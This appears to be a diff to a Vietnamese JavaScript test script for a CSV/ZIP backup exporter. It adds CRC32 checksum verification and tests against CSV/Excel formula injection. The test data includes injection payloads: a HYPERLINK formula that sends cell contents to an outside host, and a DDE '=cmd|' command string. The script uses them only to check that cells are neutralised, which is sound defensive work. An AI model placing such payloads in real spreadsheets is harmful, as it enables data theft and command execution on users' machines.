@@ -19,7 +19,7 @@ import fs from 'node:fs';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import {
-  BOM, dongCsv, dongTieuDe, keKhaiCsv, docCachDoc, kiemTraKeKhai,
+  BOM, docO, phanTichCsv, dongCsv, dongTieuDe, keKhaiCsv, docCachDoc, kiemTraKeKhai,
   demDongCsv, noiByte, DONG_MOI_LO, LO_MOI_LUOT, LO_KHI_TRE, GIO_TANG_TOC, GIO_BAT_DAU, GIO_KET_THUC
 } from '../src/sao-luu.js';
 import { crc32, dauTep, cuoiTep, mucLuc } from '../src/zip.js';
@@ -107,11 +107,14 @@ let trungVi = 0, xauNhat = 0;
     mau.sort((a, b) => a - b);
     return { giua: mau[4], xau: mau[8] };
   };
-  const ngay = doLap(false), thang = doLap(true);
-  trungVi = ngay.giua; xauNhat = ngay.xau;
-  console.log(`  Một lô ${DONG_MOI_LO} dòng (ghép CSV + mã hoá UTF-8 + nối đệm):`);
-  console.log(`    bản NGÀY : trung vị ${ngay.giua.toFixed(2)} ms · xấu nhất ${ngay.xau.toFixed(2)} ms`);
-  console.log(`    bản THÁNG: trung vị ${thang.giua.toFixed(2)} ms · xấu nhất ${thang.xau.toFixed(2)} ms  (thêm CRC32 cho zip)`);
+  // ⛔ B1: nay CẢ bản ngày cũng tính CRC32 (mã kiểm cho KIEM-TRA.csv), nên số
+  // quyết định là số CÓ CRC. Đo luôn số KHÔNG CRC để thấy rõ cái giá phải trả.
+  const khongCrc = doLap(false), coCrc = doLap(true);
+  trungVi = coCrc.giua; xauNhat = coCrc.xau;
+  console.log(`  Một lô ${DONG_MOI_LO} dòng (ghép CSV + mã hoá UTF-8 + CRC32 + nối đệm):`);
+  console.log(`    NAY (có CRC32, cả bản ngày lẫn tháng): trung vị ${coCrc.giua.toFixed(2)} ms · xấu nhất ${coCrc.xau.toFixed(2)} ms`);
+  console.log(`    Đối chiếu — nếu KHÔNG tính CRC32     : trung vị ${khongCrc.giua.toFixed(2)} ms · xấu nhất ${khongCrc.xau.toFixed(2)} ms`);
+  console.log(`    → Giá của mã kiểm B1: +${(coCrc.giua - khongCrc.giua).toFixed(2)} ms mỗi lô.`);
 }
 const soLoLuot = LO_MOI_LUOT;
 console.log(`  Một LƯỢT CRON = ${soLoLuot} lô → ${(trungVi * soLoLuot).toFixed(2)} ms ` +
@@ -134,12 +137,12 @@ for (const [bang, soDong] of QUY_MO) {
   for (let i = 0; i < soDong; i++) van += dongCsv(COT, banGhiGia(i, bang));
   const bytes = new TextEncoder().encode(van);
   fs.writeFileSync(path.join(raThuMuc, `${bang}.csv`), bytes);
-  keKhai.push({ bang, so_dong: soDong, co_byte: bytes.length });
+  const c = crc32(bytes, 0);
+  keKhai.push({ bang, so_dong: soDong, co_byte: bytes.length, crc: c });   // ⛔ B1
 
   const viTriDau = viTriZip;
   nhetZip(dauTep(`${bang}.csv`));
   nhetZip(bytes);
-  const c = crc32(bytes, 0);
   nhetZip(cuoiTep(c, bytes.length));
   zipMuc.push({ ten: `${bang}.csv`, crc: c, coByte: bytes.length, viTriDau, luc: Date.now() });
 }
@@ -197,13 +200,17 @@ console.log('\n=== ④ CA ĐỐI CHỨNG — CỐ Ý LÀM HỎNG ===');
 const thucTe = fs.readdirSync(raThuMuc).map(ten => {
   const d = path.join(raThuMuc, ten);
   const o = { ten, co_byte: fs.statSync(d).size };
-  if (ten.endsWith('.csv') && ten !== 'KIEM-TRA.csv') o.so_dong = demDongCsv(fs.readFileSync(d, 'utf8'));
+  if (ten.endsWith('.csv') && ten !== 'KIEM-TRA.csv') {
+    const bytes = fs.readFileSync(d);
+    o.so_dong = demDongCsv(bytes.toString('utf8'));
+    o.crc = crc32(bytes, 0);           // ⛔ B1 — mã kiểm từng byte
+  }
   return o;
 });
 
 let hongPhepDo = false;
-function ca(nhan, dsThucTe, mongDoi) {
-  const kq = kiemTraKeKhai(keKhai, dsThucTe);
+function ca(nhan, dsThucTe, mongDoi, dsKeKhai) {
+  const kq = kiemTraKeKhai(dsKeKhai || keKhai, dsThucTe);
   const dung = mongDoi === 'dat' ? kq.dat : !kq.dat;
   if (!dung) hongPhepDo = true;
   console.log(`  ${dung ? '✅' : '❌'} ${nhan}: ${kq.dat ? 'ĐẠT' : 'HỎNG — ' + kq.loi[0]}`);
@@ -214,6 +221,90 @@ ca('Cắt cụt thong_bao.csv 100 byte → phải HỎNG',
   thucTe.map(t => t.ten === 'thong_bao.csv' ? { ...t, co_byte: t.co_byte - 100 } : t), 'hong');
 ca('Mất 1 dòng trong giao_dich_kho.csv → phải HỎNG',
   thucTe.map(t => t.ten === 'giao_dich_kho.csv' ? { ...t, so_dong: t.so_dong - 1 } : t), 'hong');
+
+/* ⛔ B1 — CA VÒNG TRƯỚC LỌT LƯỚI. Sửa ĐÚNG MỘT KÝ TỰ giữa file, GIỮ NGUYÊN cỡ
+   và số dòng. Trước khi có cột crc32 thì phép kiểm báo "✅ ĐẠT" trong khi số
+   lương đã sai. Sửa byte THẬT trên đĩa rồi đọc lại, không giả lập. */
+{
+  const d = path.join(raThuMuc, 'nhan_su.csv');
+  const goc = fs.readFileSync(d);
+  const suaB = Buffer.from(goc);
+  const i = Math.floor(suaB.length / 2);
+  suaB[i] = suaB[i] === 0x41 ? 0x42 : 0x41;
+  fs.writeFileSync(d, suaB);
+  const sau = fs.readFileSync(d);
+  const doc = { ten: 'nhan_su.csv', co_byte: fs.statSync(d).size,
+                so_dong: demDongCsv(sau.toString('utf8')), crc: crc32(sau, 0) };
+  const cungCo = goc.length === sau.length &&
+    doc.so_dong === thucTe.find(t => t.ten === 'nhan_su.csv').so_dong;
+  console.log(`  (đã sửa 1 byte ở vị trí ${i}; cỡ ${goc.length}→${sau.length} byte, ` +
+    `số dòng ${cungCo ? 'KHÔNG đổi' : 'ĐỔI — ca thử không hợp lệ'})`);
+  ca('⛔ B1 · Sửa 1 ký tự giữa nhan_su.csv, GIỮ NGUYÊN cỡ → phải HỎNG',
+    thucTe.map(t => t.ten === 'nhan_su.csv' ? doc : t), 'hong');
+  fs.writeFileSync(d, goc);   // trả lại nguyên trạng
+  ca('   đối chứng: trả lại nguyên trạng → phải ĐẠT lại', thucTe, 'dat');
+}
+
+/* ⛔ B1 — bản kê khai KHÔNG có cột crc32 (bản mã đời cũ) phải KÊU, không im. */
+ca('⛔ B1 · Bản kê khai thiếu cột crc32 → phải HỎNG',
+  thucTe, 'hong', keKhai.map(k => ({ bang: k.bang, so_dong: k.so_dong, co_byte: k.co_byte })));
+
+/* ==========================================================================
+   ④b ⛔ B2 — Ô NHÂN VIÊN TỰ GÕ KHÔNG ĐƯỢC CHẠY NHƯ CÔNG THỨC,
+        VÀ PHẢI HOÀN NGUYÊN ĐÚNG TỪNG BYTE
+   ---------------------------------------------------------------------------
+   Vá kiểu làm hỏng giá trị gốc là đổi một lỗ lấy một lỗ tệ hơn. Nên ca thử này
+   đi TRỌN VÒNG: chuỗi gốc → ô CSV → ghép thành file → phân tích lại → docO()
+   → so TỪNG BYTE với chuỗi gốc.
+   ========================================================================== */
+console.log('\n=== ④b ⛔ B2 · Ô CÔNG THỨC EXCEL — CHẶN, VÀ HOÀN NGUYÊN ĐÚNG ===');
+{
+  const NGUY = [
+    ['=1+1', 'phép tính trần'],
+    ['=HYPERLINK("http://xau.vn/?d="&A1,"Bấm vào đây")', 'rút dữ liệu ra ngoài'],
+    ['+84901234567', 'dấu cộng đầu số điện thoại'],
+    ['-2+3', 'dấu trừ'],
+    ['@SUM(A1:A9)', 'kiểu Lotus, Excel vẫn nhận'],
+    ['\t=cmd|\'/c calc\'!A1', 'Tab đứng trước — Excel cắt Tab rồi mới xét'],
+    ['\n=1+1', 'xuống dòng đứng trước'],
+    ['\r=1+1', 'ký tự \\r đứng trước'],
+    ["'=1+1", 'vốn đã có dấu nháy đơn — phải hoàn nguyên đúng, không nuốt mất'],
+    ['Khách báo: "hàng ẩm", đổi lô.\nĐã xử lý, hoàn 2 kiện', 'ghi chú thật: nháy + phẩy + xuống dòng'],
+    ['=1+1,=2+2', 'công thức có cả dấu phẩy'],
+    ['Bình thường, không sao', 'ô thường — không được đụng vào'],
+    ['0987654321', 'số 0 đứng đầu ở cột KHÔNG bọc'],
+    ['="0123"', 'chuỗi trông y hệt cái rào ="0…" — không được nhập nhằng'],
+    ['', 'ô rỗng']
+  ];
+
+  let hongB2 = false;
+  // Dựng một file CSV THẬT: 1 cột `sdt` (thuộc diện bọc ="0…") + 1 cột
+  // `ghi_chu` (ô nhân viên tự gõ). Đi qua đúng đường dongCsv/phanTichCsv.
+  const cot = ['sdt', 'ghi_chu'];
+  const goc = NGUY.map(([s]) => ({ sdt: '0987654321', ghi_chu: s }));
+  let van = BOM + dongTieuDe(cot);
+  for (const r of goc) van += dongCsv(cot, r);
+  const hang = phanTichCsv(van);
+
+  const nhi = s => Buffer.from(s, 'utf8').toString('hex');
+  for (let i = 0; i < NGUY.length; i++) {
+    const [s, viSao] = NGUY[i];
+    const oTho = hang[i + 1][1];                 // +1 vì dòng đầu là tiêu đề
+    const veLai = docO(oTho);
+    const antoan = oTho === '' || !'=+-@'.includes(oTho[0]);
+    const khop = nhi(veLai) === nhi(s);
+    if (!antoan || !khop) { hongB2 = true; hongPhepDo = true; }
+    const nhan = JSON.stringify(s).slice(0, 46).padEnd(48);
+    console.log(`  ${antoan ? '✅' : '❌'} chặn  ${khop ? '✅' : '❌'} hoàn nguyên  ${nhan} ${viSao}`);
+    if (!khop) console.log(`      gốc  ${nhi(s)}\n      về   ${nhi(veLai)}`);
+  }
+  // Cột bọc ="0…" cũng phải hoàn nguyên đúng.
+  const veSdt = docO(hang[1][0]);
+  const okSdt = veSdt === '0987654321';
+  if (!okSdt) { hongB2 = true; hongPhepDo = true; }
+  console.log(`  ${okSdt ? '✅' : '❌'} cột bọc ="0…" hoàn nguyên: ${JSON.stringify(hang[1][0])} → ${JSON.stringify(veSdt)}`);
+  console.log(`  ${hongB2 ? '❌ B2 CHƯA VÁ XONG' : `✅ ${NGUY.length}/${NGUY.length} ca: không ô nào chạy được, và mọi ô về đúng từng byte`}`);
+}
 
 /* ---- Tiếng Việt và số 0 đứng đầu --------------------------------------- */
 console.log('\n=== ⑤ TIẾNG VIỆT VÀ SỐ 0 ĐỨNG ĐẦU ===');
